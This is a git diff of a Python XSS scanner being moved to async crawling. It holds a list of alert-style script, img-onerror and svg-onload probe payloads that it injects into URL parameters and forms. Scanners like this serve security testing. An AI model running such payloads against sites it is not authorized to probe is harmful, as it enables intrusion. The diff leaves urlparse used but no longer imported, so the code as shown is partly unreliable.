@@ -1,26 +1,28 @@
 import urllib.parse
-from urllib.parse import urlparse, parse_qs
+from urllib.parse import parse_qs
 import validators
 from .forms import *
-from bs4 import BeautifulSoup as bs
+import asyncio
+import aiohttp
+from .crawler import *
 
 string_terminators = ["", "'", ";", "';", ]
 
-payloads = ["<script>alert(1)</script>", "<img src=X onerror=alert(1)/>", "<svg onload=alert('XSS')>"]
+payloads = ["<img src=X onerror=alert(1)/>", "<svg onload=alert('XSS')>", "<script>alert(1)</script>"]
 
 unique_string = "Approx is knocking"
 
 vulnerable_links = []
 
-
 class xss_scanner:
     exploited_urls = []
     escape_chars = ["'", '">', ";"]
 
-    def __init__(self, url, cookies=None, headers=None):
+    def __init__(self, url, crawler, cookies=None, headers=None):
         self.url = url
         self.cookies = cookies,
         self.headers = headers,
+        self.crawler = crawler
 
     def check_url(self):
         return validators.url(self.url)
@@ -50,6 +52,7 @@ class xss_scanner:
         return False
 
     def has_parameters(self):
+        #Non-async
         if self.check_url():
             parsed_url = urlparse(self.url)
             query = parsed_url.query
@@ -59,7 +62,7 @@ class xss_scanner:
             else:
                 return True
 
-    def reflected_xss(self):
+    async def reflected_xss(self, session):
         if self.has_parameters():
             parsed_url = urlparse(self.url)
             query = parsed_url.query
@@ -75,28 +78,37 @@ class xss_scanner:
                     new_parts = list(parsed_url)
                     new_parts[4] = urllib.parse.urlencode(parameters)
                     build_url = urllib.parse.urlunparse(new_parts)
-                    data = requests.get(build_url).text
-                    if P in data:
-                        print("Reflected XSS found at {} triggered with {}".format(self.url, P))
-                        break
+                    async with session.get(build_url) as data:
+                        data = await data.text(encoding="utf-8")
+                        if P in data:
+                            return f'Reflected XSS found at {self.url} triggered with {P}'
                 parameters[parameter] = current_Value
 
-    def main(self):
-        formslist = forms.get_forms(url=self.url, cookies=self.cookies[0])
-        for form in formslist:
+    async def reflected_main(self):
+        async with aiohttp.ClientSession(cookies=self.cookies[0]) as session:
+            tasks = []
+            for url in self.crawler:
+                self.set_url(url)
+                task = asyncio.ensure_future(self.reflected_xss(session=session))
+                tasks.append(task)
+                response = await asyncio.gather(*tasks)
+            for i in response:
+                if i is not None:
+                    print(i)
+
+    def run_xss(self, form_list):
+        asyncio.run(self.reflected_main())
+        response = asyncio.run(
+            forms.async_submit(cookies=self.cookies[0], formlist=form_list, payloads=payloads))
+        for each_page in response:
             for P in payloads:
-                response = forms.submit(url=self.url, form_specs=form, payload=P, cookies=self.cookies[0])
-                if P in response[0].decode():
-                    if response[1] not in vulnerable_links:
-                        print("XSS Found at {} endpoint triggered with {} payload".format(response[1], P))
-                        vulnerable_links.append(response[1])
-                        break
-                else:
-                    self.reflected_xss()
+                if P in each_page[0]['content']:
+                    if each_page[0]['url'] not in vulnerable_links:
+                        print("XSS Found with a form instance {} with {} payload".format(each_page[0]['url'],P))
+                        vulnerable_links.append(each_page[0]['url'])
 
 
-if __name__ == '__main__':
-    scanner = xss_scanner(url="http://testphp.vulnweb.com/userinfo.php", cookies={"login":"test/test"})
-    scanner.main()
+
+
 
 
